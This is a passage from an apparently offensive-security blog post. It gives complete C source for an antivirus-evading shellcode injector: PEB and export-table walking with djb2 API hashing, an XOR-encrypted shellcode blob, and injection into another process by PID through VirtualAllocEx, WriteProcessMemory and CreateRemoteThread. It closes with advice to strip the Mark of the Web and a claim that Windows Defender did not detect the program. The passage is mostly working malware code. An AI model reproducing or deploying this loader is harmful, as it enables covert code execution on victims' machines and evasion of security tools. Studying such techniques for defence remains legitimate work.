Function : WriteProcessMemory
  Hash          : 0x686d7128
  GetProcAddress: 00007ffb8628d2f0
  LoadFunction  : 00007ffb8628d2f0
  Match         : YES

Function : CreateThread
  Hash          : 0xe819b491
  GetProcAddress: 00007ffb8626bd30
  LoadFunction  : 00007ffb8626bd30
  Match         : YES

Function : HeapAlloc
  Hash          : 0xb1ce974e
  GetProcAddress: 00007ffb8817a9a0
  LoadFunction  : 00007ffb8817a9a0
  Match         : YES
```

```bash
#define HASH_OpenProcess               0xBC153E16
#define HASH_VirtualAllocEx            0xFABD2B14
#define HASH_WriteProcessMemory        0x686D7128
#define HASH_CreateRemoteThread        0xD6057BBD
#define HASH_WaitForSingleObject       0xDA18E23A
#define HASH_CloseHandle               0x2EAC8647
#define HASH_VirtualFreeEx             0x8046A46B
#define HASH_VirtualProtectEx          0xEE45728A
```
# Final Code

Now we will add simple XOR shellcode encryption from previous Early Bird blog to do Remote Process Injection using PEB Walking + API hashing.

```c
#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <intrin.h>
#include <wchar.h>

// djb2 hash (case-insensitive)
// We compare hashes at runtime so function name strings never live in the binary.

static uint32_t djb2(const char *s)
{
    uint32_t h = 5381;
    int c;
    while ((c = (unsigned char)*s++) != 0) {
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
    }
    return h;
}

// Pre-computed hashes - generate with hashgen.c if you need more.
// These are the only representation of those API names in this binary.

#define H_OpenProcess           0xBC153E16
#define H_VirtualAllocEx        0xFABD2B14
#define H_WriteProcessMemory    0x686D7128
#define H_CreateRemoteThread    0xD6057BBD
#define H_WaitForSingleObject   0xDA18E23A
#define H_CloseHandle           0x2EAC8647
#define H_VirtualFreeEx         0x8046A46B
#define H_VirtualProtectEx      0xEE45728A

// PEB / LDR structures
// Defined manually so we don't rely on the SDK versions which are often incomplete.

typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNI_STR;

typedef struct {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR;

typedef struct {
    BYTE       Reserved1[2];
    BYTE       BeingDebugged;
    BYTE       Reserved2[1];
    PVOID      Reserved3[2];
    MY_PEB_LDR *Ldr;
} MY_PEB;

typedef struct {
    LIST_ENTRY InLoadOrderLinks;            // +0x00
    LIST_ENTRY InMemoryOrderLinks;          // +0x10
    LIST_ENTRY InInitializationOrderLinks;  // +0x20
    PVOID      DllBase;                     // +0x30
    PVOID      EntryPoint;                  // +0x38
    ULONG      SizeOfImage;                 // +0x40
    UNI_STR    FullDllName;                 // +0x48
    UNI_STR    BaseDllName;                 // +0x58
} MY_LDR_ENTRY;

// Wide-char case-insensitive compare, no CRT import needed.
// Same helper used in the blog's PEB walking section.

static int wiequal(const wchar_t *a, USHORT a_bytes, const wchar_t *b)
{
    USHORT len = a_bytes / sizeof(wchar_t);
    for (USHORT i = 0; i < len; i++) {
        wchar_t ca = a[i], cb = b[i];
        if (cb == L'\0') return 0;
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return 0;
    }
    return b[len] == L'\0';
}

// ASCII to wide - used when resolving forwarder DLL names like "NTDLL" -> L"NTDLL".

static void a2w(const char *src, wchar_t *dst, size_t max)
{
    size_t i = 0;
    while (src[i] && i < max - 1) { dst[i] = (wchar_t)src[i]; i++; }
    dst[i] = L'\0';
}

// Inline atoi so we don't pull in msvcrt just for argument parsing.

static DWORD str_to_dword(const char *s)
{
    DWORD n = 0;
    while (*s >= '0' && *s <= '9') n = n * 10 + (DWORD)(*s++ - '0');
    return n;
}

// PEB walking - resolves a DLL base address without GetModuleHandleA.
// Reads TEB from gs:[0x30], walks to PEB at +0x60, then traverses
// InMemoryOrderModuleList comparing BaseDllName at each entry.

static PVOID peb_module(const wchar_t *name)
{
    PVOID      teb = (PVOID)__readgsqword(0x30);
    MY_PEB    *peb = *(MY_PEB **)((BYTE *)teb + 0x60);
    MY_PEB_LDR *ldr = peb->Ldr;

    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *cur  = head->Flink;

    while (cur != head) {
        // Flink lands at InMemoryOrderLinks (+0x10 inside the struct) so we
        // subtract 0x10 to reach the top of LDR_DATA_TABLE_ENTRY.
        MY_LDR_ENTRY *e = (MY_LDR_ENTRY *)((BYTE *)cur - 0x10);
        if (e->BaseDllName.Buffer && e->BaseDllName.Length)
            if (wiequal(e->BaseDllName.Buffer, e->BaseDllName.Length, name))
                return e->DllBase;
        cur = cur->Flink;
    }
    return NULL;
}

// EAT walking - resolves a function VA from a DLL base using a djb2 hash.
// Handles forwarder chains by recursing into the forwarded DLL via another
// PEB walk, exactly as GetProcAddress does internally.

static PVOID eat_resolve(PBYTE mod, uint32_t hash)
{
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(mod + ((PIMAGE_DOS_HEADER)mod)->e_lfanew);
    DWORD expRVA  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD expSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(mod + expRVA);
    PDWORD names = (PDWORD)(mod + exp->AddressOfNames);
    PDWORD funcs = (PDWORD)(mod + exp->AddressOfFunctions);
    PWORD  ords  = (PWORD) (mod + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        LPSTR nm = (LPSTR)(mod + names[i]);
        if (djb2(nm) != hash) continue;

        DWORD rva = funcs[ords[i]];

        // Forwarder check: RVA inside the export directory region means this is
        // a forwarder string like "NTDLL.RtlAllocateHeap", not actual code.
        if (rva >= expRVA && rva < expRVA + expSize) {
            LPSTR fwd = (LPSTR)(mod + rva);
            CHAR  dll[MAX_PATH] = {0};
            CHAR  fn [MAX_PATH] = {0};
            LPSTR dot = strchr(fwd, '.');
            if (!dot) return NULL;
            size_t dlen = (size_t)(dot - fwd);
            memcpy(dll, fwd, dlen);
            strcpy(dll + dlen, ".dll");
            strcpy(fn, dot + 1);

            wchar_t dllW[MAX_PATH] = {0};
            a2w(dll, dllW, MAX_PATH);

            // Recurse because the forwarded DLL might itself forward again.
            PVOID next = peb_module(dllW);
            if (!next) return NULL;
            return eat_resolve((PBYTE)next, djb2(fn));
        }

        return (PVOID)(mod + rva);
    }
    return NULL;
}

#define RESOLVE(base, hash, type) ((type)eat_resolve((PBYTE)(base), (hash)))

typedef HANDLE (WINAPI *FnOpenProcess)         (DWORD, BOOL, DWORD);
typedef LPVOID (WINAPI *FnVirtualAllocEx)      (HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *FnWriteProcessMemory)  (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE (WINAPI *FnCreateRemoteThread)  (HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *FnWaitForSingleObject) (HANDLE, DWORD);
typedef BOOL   (WINAPI *FnCloseHandle)         (HANDLE);
typedef BOOL   (WINAPI *FnVirtualFreeEx)       (HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *FnVirtualProtectEx)    (HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);

// Original bytes XORed with key 0xAA at build time.

#define XOR_KEY 0xAA

static const unsigned char sc_enc[] =
    // 433 bytes, key 0xAA
    "\xE2\x29\x46\x82\xE2\x29\x4E\x5A\xE2\x27\xBF\xCC\xAA\xAA\xAA"
    "\xE2\x27\xA7\xF8\xAA\xAA\xAA\x42\x34\xAA\xAA\xAA\xE6\x21\x52"
    "\xE2\x27\xA7\xF7\xAA\xAA\xAA\x55\x7A\xE2\x27\xBF\xF5\xAA\xAA"
    "\xAA\xE2\x27\xA7\xE7\xAA\xAA\xAA\x42\xD5\xAA\xAA\xAA\xE7\x99"
    "\x63\xE6\x27\xAF\xCB\xAA\xAA\xAA\xE2\x27\xBF\xE4\xAA\xAA\xAA"
    "\xE2\x99\x63\x55\x7A\xE2\x27\xBF\xFC\xAA\xAA\xAA\xE2\x27\xA7"
    "\xA0\xAA\xAA\xAA\x42\xFC\xAA\xAA\xAA\xE2\x99\x63\x55\x7A\xE1"
    "\xEF\xF8\xE4\xEF\xE6\x99\x98\x84\xEE\xE6\xE6\xAA\xE6\xC5\xCB"
    "\xCE\xE6\xC3\xC8\xD8\xCB\xD8\xD3\xEB\xAA\xFF\xF9\xEF\xF8\x99"
    "\x98\x84\xEE\xE6\xE6\xAA\xE7\xCF\xD9\xD9\xCB\xCD\xCF\xE8\xC5"
    "\xD2\xEB\xAA\xE2\xCF\xC6\xC6\xC5\x8A\xDD\xC5\xD8\xC6\xCE\xAA"
    "\xE7\xCF\xD9\xD9\xCB\xCD\xCF\xAA\xEF\xD2\xC3\xDE\xFA\xD8\xC5"
    "\xC9\xCF\xD9\xD9\xAA\xE2\x29\x46\x82\xCF\xE6\x21\xAE\x8F\xCA"
    "\xAA\xAA\xAA\xE7\x21\xEA\xB2\xE7\x27\xCA\xBA\xE7\x21\xAE\x8E"
    "\x56\xE3\x21\xD2\xCA\xE2\x21\x5B\x06\x2E\x6A\xDE\x8C\x20\x8D"
    "\x2A\x56\xCB\xD6\xA9\x2A\x46\x8A\x90\x4A\xDF\xA2\xE2\x55\x6D"
    "\xE2\x55\x6D\x41\x4F\xE7\x21\xAA\xE7\x91\x6E\xDF\x7C\xE2\x99"
    "\x6A\x43\x0D\xAA\xAA\xAA\xE3\x21\xF2\x9A\xEE\x21\xE1\x96\xE6"
    "\xA9\x61\xE3\x2B\x6B\x22\xAA\xAA\xAA\xEF\x21\x83\xE7\x2F\x47"
    "\xDF\xA2\xE2\x99\x6A\x43\x2F\xAA\xAA\xAA\xE4\x27\xAE\x81\xEF"
    "\x21\xDB\xAE\xE7\xA9\x5F\xEB\x21\xE2\xB2\xEF\x21\xFA\x8A\xE6"
    "\xA9\x79\x55\x63\xE7\x27\xA6\x20\xEB\x21\x93\xE2\xA9\x51\xE2"
    "\x21\x58\x0C\xDF\xA2\x20\xAC\x2E\x6A\xDE\xA3\x41\x5F\x48\x4C"
    "\xE2\x99\x6A\x41\xE4\xEF\x21\xE2\x8E\xE6\xA9\x61\xCC\xEB\x21"
    "\xA6\xE3\xEF\x21\xE2\xB6\xE6\xA9\x61\xEB\x21\xAE\x23\xE3\x91"
    "\x6F\xD6\x85\xE3\x91\x6C\xD9\x80\xE2\x27\x9E\xB2\xE2\x27\xD6"
    "\x8E\x9A\xE6\x21\x4D\x0E\x2A\x94\x84\xDF\x50\x0E\x6D\xAD\xEE"
    "\xE6\xE6\xAA\xE3\x21\x66\xEB\x55\x7D\xE3\x21\x66\xE2\x21\x7C"
    "\x43\xBE\x55\x55\x55\xE2\xA9\x69\xE2\x29\x6E\x82\x69";

static void xor_decrypt(const unsigned char *src, unsigned char *dst, SIZE_T len)
{
    for (SIZE_T i = 0; i < len; i++)
        dst[i] = src[i] ^ XOR_KEY;
}

// main

int main(int argc, char *argv[])
{
    if (argc != 2) return 1;

    DWORD  pid    = str_to_dword(argv[1]);
    SIZE_T sc_len = sizeof(sc_enc) - 1;   // strip C-string null terminator

    // Resolve kernel32 base via PEB walk, no GetModuleHandleA in IAT.
    PVOID k32 = peb_module(L"kernel32.dll");
    if (!k32) return 1;

    // Resolve all needed APIs via EAT walk + djb2, no suspicious entries in IAT.
    FnOpenProcess         pOpenProcess         = RESOLVE(k32, H_OpenProcess,         FnOpenProcess);
    FnVirtualAllocEx      pVirtualAllocEx      = RESOLVE(k32, H_VirtualAllocEx,      FnVirtualAllocEx);
    FnWriteProcessMemory  pWriteProcessMemory  = RESOLVE(k32, H_WriteProcessMemory,  FnWriteProcessMemory);
    FnCreateRemoteThread  pCreateRemoteThread  = RESOLVE(k32, H_CreateRemoteThread,  FnCreateRemoteThread);
    FnWaitForSingleObject pWaitForSingleObject = RESOLVE(k32, H_WaitForSingleObject, FnWaitForSingleObject);
    FnCloseHandle         pCloseHandle         = RESOLVE(k32, H_CloseHandle,         FnCloseHandle);
    FnVirtualFreeEx       pVirtualFreeEx       = RESOLVE(k32, H_VirtualFreeEx,       FnVirtualFreeEx);
    FnVirtualProtectEx    pVirtualProtectEx    = RESOLVE(k32, H_VirtualProtectEx,    FnVirtualProtectEx);

    if (!pOpenProcess || !pVirtualAllocEx || !pWriteProcessMemory ||
        !pCreateRemoteThread || !pWaitForSingleObject || !pCloseHandle ||
        !pVirtualProtectEx)
        return 1;

    // Decrypt shellcode into a local heap buffer.
    // The encrypted blob in .rdata is meaningless to a static scanner;
    // plaintext only exists in this buffer at runtime.
    unsigned char *sc_plain = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, sc_len);
    if (!sc_plain) return 1;
    xor_decrypt(sc_enc, sc_plain, sc_len);

    // Open the target process.
    HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { HeapFree(GetProcessHeap(), 0, sc_plain); return 1; }

    // Allocate RW memory in the target process - never RWX.
    // RWX in a remote process is one of the strongest behavioral heuristics.
    // We write as RW then flip to RX after the write is done.
    LPVOID remote = pVirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) {
        HeapFree(GetProcessHeap(), 0, sc_plain);
        pCloseHandle(hProc);
        return 1;
    }

    // Write the decrypted shellcode into the target.
    SIZE_T written = 0;
    if (!pWriteProcessMemory(hProc, remote, sc_plain, sc_len, &written) || written != sc_len) {
        HeapFree(GetProcessHeap(), 0, sc_plain);
        pVirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        pCloseHandle(hProc);
        return 1;
    }

    // Wipe and free our local plaintext copy now that it is in the target.
    SecureZeroMemory(sc_plain, sc_len);
    HeapFree(GetProcessHeap(), 0, sc_plain);

    // Flip the remote region from RW to RX before executing.
    // At no point does an RWX region exist in the target.
    DWORD old_prot = 0;
    if (!pVirtualProtectEx(hProc, remote, sc_len, PAGE_EXECUTE_READ, &old_prot)) {
        pVirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        pCloseHandle(hProc);
        return 1;
    }

    // Kick off a remote thread at the shellcode entry point.
    HANDLE hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    if (!hThread) {
        pVirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        pCloseHandle(hProc);
        return 1;
    }

    pWaitForSingleObject(hThread, 5000);

    pVirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
    pCloseHandle(hThread);
    pCloseHandle(hProc);
    return 0;
}
```


---

Remove the Mark Of The Web `Zone.Identifier`:

![](/img/lfg.png)

Windows Defender doesn't detect it which means our evading is indeed successful. This is will only work on defenders if this was EDR we would need to evade behavioral analysis too which we will cover next time.

---
